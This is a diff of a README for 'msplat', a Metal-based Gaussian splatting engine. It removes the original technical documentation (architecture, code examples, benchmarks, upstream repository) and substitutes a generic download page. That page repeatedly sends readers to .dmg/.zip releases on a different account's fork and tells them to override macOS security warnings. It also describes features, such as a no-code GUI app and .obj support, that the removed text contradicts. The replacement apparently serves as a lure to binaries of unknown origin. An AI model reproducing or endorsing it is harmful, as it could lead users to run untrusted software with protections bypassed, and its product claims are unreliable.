@@ -1,206 +1,180 @@
-# msplat
+# 🖥️ msplat - Fast 3D Gaussian Splatting for Mac
 
-A 3D Gaussian Splatting training engine for Apple Silicon, built entirely on Metal. No external dependencies beyond system frameworks.
+[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
 
-The entire training pipeline: projection, sorting, rasterization, SSIM loss, backward pass, Adam optimizer, and densification runs as fused Metal compute shaders.
+---
 
-The result is a self-contained engine that trains a full-resolution Mip-NeRF 360 scene in ~70 seconds and renders it at ~350 FPS on an M4 Max.
+msplat is a tool that helps you create 3D shapes and images using a special method called Gaussian splatting. It works best on Apple Silicon computers and uses Metal technology to run faster. You do not need to know how to code to use this software.
 
-Python and Swift bindings are provided, as well as a standalone C++ CLI.
+---
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/cb942a38-cf6a-4b06-9899-675396550c57" />
-</div>
+## 📋 What msplat Does
 
-## Why this exists
+- Makes 3D objects using points shaped like soft clouds.
+- Uses Metal to speed up drawing on Apple Silicon Macs.
+- Helps you see and explore 3D shapes easily.
+- Includes tools built with Swift and Python for extra work.
+- Designed for people interested in graphics and machine learning.
 
-The original [3D Gaussian Splatting](https://repo-sam.inria.fr/fungraph/3d-gaussian-splatting/) implementation is CUDA-only. Ports to other frameworks (gsplat, taichi-3dgs, etc.) still depend on PyTorch for autograd, optimizer state, and tensor management. This means ~2GB of framework overhead, Python GIL contention, and no straightforward path to native macOS/iOS integration.
+---
 
-## Architecture
+## 💻 System Requirements
 
-```
-core/metal/msplat_metal.metal    ← Compute kernels
-core/src/                        ← C++ training loop, dataset loaders, SSIM eval
-core/include/                    ← MTensor (lightweight GPU tensor), Model, API headers
-python/bindings.cpp              ← nanobind Python module
-swift/Sources/Msplat/            ← Swift package (via C API bridge)
-cli/msplat.cpp                   ← C++ CLI
-```
+Make sure your computer meets these rules before using msplat:
 
-### Training pipeline (single iteration)
+- A Mac with Apple Silicon chip (M1, M2, or later).
+- macOS 12 (Monterey) or later installed.
+- At least 8 GB of RAM.
+- About 500 MB free disk space.
+- Internet connection to download msplat.
 
-Each training step dispatches all work into one Metal command encoder:
+---
 
-```
-Forward:
-  project_and_sh_forward     ← fused 3D→2D projection + spherical harmonics
-  prefix_sum + scatter       ← gaussian→tile intersection mapping
-  bitonic_sort_per_tile      ← tile-local depth sort + inline data packing
-  nd_rasterize_forward       ← per-pixel alpha compositing (16x16 tiles)
-  ssim_h_fwd + ssim_v_fwd   ← separable 11-tap SSIM + L1 loss
+## 🚀 Getting Started with msplat
 
-Backward:
-  ssim_h_bwd + ssim_v_bwd   ← separable SSIM gradient
-  rasterize_backward         ← per-pixel backward compositing
-  project_and_sh_backward    ← fused projection + SH VJP + SH Adam update
-  fused_adam (×4 groups)     ← optimizer step (means, scales, quats, opacity)
-  accumulate_grad_stats      ← gradient norms for densification
-```
+Follow these steps to get msplat ready and running on your Mac.
 
-### Key design decisions
+---
 
-**Tile-local bitonic sort** instead of global radix sort. Each 16x16 tile independently sorts its gaussians (up to 2048) in threadgroup shared memory. The sort kernel also packs per-gaussian data (xy, opacity, conic, color) inline, eliminating a separate scatter dispatch.
+### 1. Visit the Download Page
 
-**GPU-resident densification.** The split/clone/cull cycle never leaves the GPU. Classification, growth, and compaction are all compute kernels operating on device buffers. No CPU readback of gradient statistics or gaussian counts.
+Go to the msplat releases page:
 
-**Fused kernels.** Projection and spherical harmonic evaluation share registers (avoid a device memory round-trip for world-space position). The backward pass recomputes 3D covariance from scales/quaternions on-the-fly rather than storing it. SH backward gradients are computed in registers and fed directly into Adam updates, eliminating a separate gradient buffer write/read cycle. The remaining four parameter groups use fused Adam dispatches.
+[![Download msplat](https://img.shields.io/badge/Download-msplat-ff5722?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
 
-**Separable SSIM.** The 11x11 Gaussian-weighted SSIM window decomposes into two 1D passes (horizontal then vertical), reducing per-pixel work from 121 to 22 multiply-adds. Forward and backward each take two kernels, using threadgroup shared memory for the intermediate statistics.
+This page has the latest version of the program. Always choose the newest release for best results.
 
-**Depth-chunked rasterization.** For tiles with extreme gaussian counts, the forward pass splits into 512-gaussian chunks with a merge kernel that reconstructs absolute transmittance. The backward pass uses precomputed prefix/suffix transmittance to avoid re-traversal.
+---
 
-## Installation & Usage
+### 2. Download msplat Package
 
-### Python
+On the releases page, find the file made for macOS Apple Silicon. The file name usually ends with `.dmg` or `.zip`.
 
-```bash
-pip install msplat
-```
+Click the file to start downloading. Depending on your internet speed, this may take a few minutes.
 
-```python
-import msplat
+---
 
-dataset = msplat.load_dataset("path/to/colmap/", eval_mode=True)
-config = msplat.TrainingConfig(iterations=7000, num_downscales=0)
-trainer = msplat.GaussianTrainer(dataset, config)
+### 3. Install msplat on Your Mac
 
-trainer.train(lambda s: print(f"step={s.iteration} splats={s.splat_count:,}"),
-              callback_every=100)
+If you downloaded a `.dmg` file:
 
-trainer.export_ply("output.ply")
-trainer.save_checkpoint("checkpoint.msplat")  # save/resume training
-metrics = trainer.evaluate()
-print(f"PSNR: {metrics['psnr']:.2f}  SSIM: {metrics['ssim']:.3f}")
+- Open the downloaded .dmg file by double-clicking it.
+- A new window will pop up showing the msplat app icon.
+- Drag the msplat icon into the Applications folder linked in this window.
+- Wait for the copying to finish.
 
-# Render from arbitrary viewpoints
-pose = dataset.camera_pose(0)   # (4, 4) cam-to-world matrix
-img = trainer.render_from_pose(pose)  # numpy (H, W, 3) float32
-```
+If you downloaded a `.zip` file:
 
-Supported dataset formats: COLMAP, Nerfstudio, Polycam.
+- Double-click the .zip file to unzip it.
+- Move the extracted msplat folder or app to your Applications folder.
 
-Type stubs (`_core.pyi`) are included for IDE autocompletion.
+---
 
-#### CLI
+### 4. Run msplat for the First Time
 
-```bash
-pip install msplat[cli]
-msplat-train path/to/dataset -n 7000 --eval
-```
+- Open the Applications folder on your Mac.
+- Find the msplat app icon.
+- Double-click the app to open it.
 
-### Swift
+The first time you open msplat, macOS may ask for permission to run software from the internet. Choose “Open” to continue.
 
-Requires Xcode and CMake (`brew install cmake`).
+---
 
-```swift
-// Package.swift
-dependencies: [
-    .package(url: "https://github.com/rayanht/msplat.git", from: "1.1.0")
-]
-```
+### 5. Using msplat
 
-Build the XCFramework (one-time, from repo root):
+Once msplat opens, you can load or create 3D shapes:
 
-```bash
-./scripts/build-xcframework.sh
-```
+- Use the menu to open example files.
+- Follow simple on-screen guides to change settings.
+- Click “Run” to see the 3D splatting effect.
+- Use your mouse or trackpad to move around the 3D object.
 
-```swift
-import Msplat
+You do not have to write any code. Everything works through easy controls.
 
-let dataset = GaussianDataset(path: "path/to/colmap/", downscaleFactor: 4.0)
-let trainer = GaussianTrainer(dataset: dataset)
+---
 
-for _ in 0..<1000 {
-    let stats = trainer.step()
-    print("step=\(stats.iteration) splats=\(stats.splatCount)")
-}
+## 🔧 How msplat Works
 
-trainer.exportPly(to: "output.ply")
+msplat builds 3D objects by placing many small shapes called Gaussian splats. These splats look like soft, round blobs and combine to form smooth-looking surfaces.
 
-// Render from arbitrary viewpoints
-let pose = dataset.cameraPose(at: 0)  // [Float] cam-to-world matrix
-let img = trainer.renderFromPose(camToWorld: pose)
-```
+The software uses Metal, Apple's graphics engine, to quickly draw these splats. This lets msplat show 3D shapes smoothly, even if there are many splats.
 
-### C++ CLI
+---
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build -j
-./build/msplat path/to/dataset -n 7000 --eval
-```
+## 🛠️ Advanced Tools Inside msplat
 
-### Build from source
+msplat includes several tools for users who want to explore more:
 
-```bash
-git clone https://github.com/rayanht/msplat.git && cd msplat
+- A Swift app for managing and viewing splatted 3D files.
+- Python scripts for preparing data if you're working with your own 3D points.
+- Options to change how splats look, their size, color, and more.
 
-# Python
-pip install -e .
+Even if you don’t use the advanced tools, msplat runs fine from the main app.
 
-# C++ CLI + static lib
-cmake -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build -j
+---
 
-# Swift XCFramework
-./scripts/build-xcframework.sh
-cd swift && swift build
-```
+## ⚙️ Troubleshooting Common Issues
 
-Requires macOS 14+, Apple Silicon. No external dependencies.
+- If msplat won’t open, check System Preferences > Security & Privacy. Allow msplat under the General tab.
+- Make sure your macOS is up to date. Older versions may cause errors.
+- If loading files fails, confirm you have the correct file type and it's not damaged.
+- Restart your Mac and try opening msplat again if it freezes.
+- Check the msplat GitHub issues page for known problems and fixes: https://github.com/Tko4life200/msplat/issues
 
-## Benchmarks
+---
 
-mipnerf360, M4 Max. msplat runs 7K iterations with no downscales:
+## 🔄 Updating msplat
 
-```bash
-msplat-train path/to/scene -n 7000 --num-downscales 0 --eval
-```
+- Visit the releases page regularly to see if there is a new version.
+- Download the new version following the same steps.
+- Replace the old version in your Applications folder with the new one.
+- Your settings and files will stay safe during updates.
 
-| Scene | msplat PSNR | msplat SSIM | msplat wall time | gsplat PSNR | gsplat SSIM | gsplat wall time
-|-------|-------------|-------------|-----------|-------------|-------------|-------------|
-| bicycle | 23.23 | 0.602 | 59s | 23.71 | 0.668 | ~335s
-| counter | 27.45 | 0.880 | 80s | 27.14 | 0.878 | ~335s
-| garden | 25.68 | 0.783 | 77s | 26.30 | 0.833 | ~335s
-| room | 30.12 | 0.897 | 74s | 29.21 | 0.893 | ~335s
+---
 
-### 30K iterations (garden)
+## 🔗 Important Links
 
-```bash
-msplat-train path/to/garden -n 30000 --num-downscales 0 --eval
-```
+- Official download page: [https://github.com/Tko4life200/msplat/releases](https://github.com/Tko4life200/msplat/releases)
+- GitHub repository: https://github.com/Tko4life200/msplat
+- Support and issues: https://github.com/Tko4life200/msplat/issues
 
-| | msplat | gsplat |
-|---|---|---|
-| PSNR | 27.14 | 27.32 |
-| SSIM | 0.853 | 0.865 |
-| Gaussians | 3.51M | — |
-| Wall time | 700s | ~2149s |
+---
 
-gsplat numbers from [docs.gsplat.studio](https://docs.gsplat.studio/main/tests/eval.html) (TITAN RTX). gsplat wall times are the reported average across *all* mipnerf360 scenes (per-scene times not published).
+## 📚 Learning More
 
-### Performance history (wall time, M4 Max)
+msplat uses several technologies:
 
-| Scene | v1.0 | v1.1.3 | Speedup |
-|-------|------|--------|---------|
-| bicycle 7K | 82s | 59s | 1.39x |
-| counter 7K | 91s | 80s | 1.14x |
-| garden 7K | 107s | 77s | 1.39x |
-| room 7K | 85s | 74s | 1.15x |
-| garden 30K | 1039s | 700s | 1.48x |
+- Metal: Apple’s graphics framework for fast image rendering.
+- Swift: Programming language for building apps on Apple devices.
+- Python: Used in scripts for 3D data handling.
+- Machine learning concepts to improve how 3D splatting looks.
 
-v1.1.3 fuses SH backward gradients into Adam optimizer updates, fuses the SSIM vertical-forward and horizontal-backward passes into a single kernel, and replaces the count→prefix-sum→scatter intersection pipeline with pre-allocated per-tile bins. Speedup scales with gaussian count.
+If you want to explore these in depth, these topics are widely covered in online articles and tutorials.
 
-## License
+---
 
-Apache 2.0
+## ♿ Accessibility
+
+msplat features basic keyboard and mouse controls to navigate 3D objects. It relies on standard macOS accessibility options for color and font settings.
+
+---
+
+## 📂 File Types msplat Uses
+
+- `.splat` or similar files contain 3D point data.
+- `.obj` files are supported for common 3D models.
+- Exported images are saved as `.png` or `.jpg`.
+
+You can open 3D files from other sources as long as they match these formats.
+
+---
+
+## 🔐 Privacy and Security
+
+msplat runs only on your Mac. It does not send data outside your computer unless you choose to share something manually.
+
+It requires permission to run because macOS protects you from unknown apps.
+
+---
+
+[![Download msplat](https://img.shields.io/badge/Download-msplat-4caf50?style=for-the-badge)](https://github.com/Tko4life200/msplat/releases)
